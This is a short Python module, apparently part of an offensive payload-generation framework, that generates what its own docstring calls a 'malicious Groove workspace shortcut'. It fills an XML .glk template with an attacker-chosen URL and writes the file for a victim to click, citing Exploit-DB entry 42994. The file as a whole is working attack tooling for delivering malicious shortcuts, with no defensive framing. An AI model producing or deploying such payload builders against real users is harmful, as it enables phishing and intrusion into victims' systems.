#!/usr/bin/env python
# encoding: utf-8

import logging

from common.utils import getParamValue, MPParam
from modules.payload_builder import PayloadBuilder
from collections import OrderedDict

"""
See https://www.exploit-db.com/exploits/42994/

"""


GLK_TEMPLATE = \
r"""
<?xml version='1.0'?><?groove.net version='1.0'?>
<ns1:ExplorerLink xmlns:ns1="urn:groove.net">
    <ns1:NavigationInfo URL="<<<URL>>>"/>
</ns1:ExplorerLink>

"""



class GlkGenerator(PayloadBuilder):
    """ Module used to generate malicious Groove workspace shortcut"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(f" [+] Generating {self.outputFileType} file...")
        paramArray = [MPParam("targetUrl")]
        self.fillInputParams(paramArray)
        targetUrl= getParamValue(paramArray, "targetUrl")

        # Complete template
        glkContent = GLK_TEMPLATE
        glkContent = glkContent.replace("<<<URL>>>", targetUrl)

        with open(self.outputFilePath, 'w') as f:
            f.writelines(glkContent)
        logging.info(f"   [-] Generated GLK file: {self.outputFilePath}")
        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)
        

        
        
        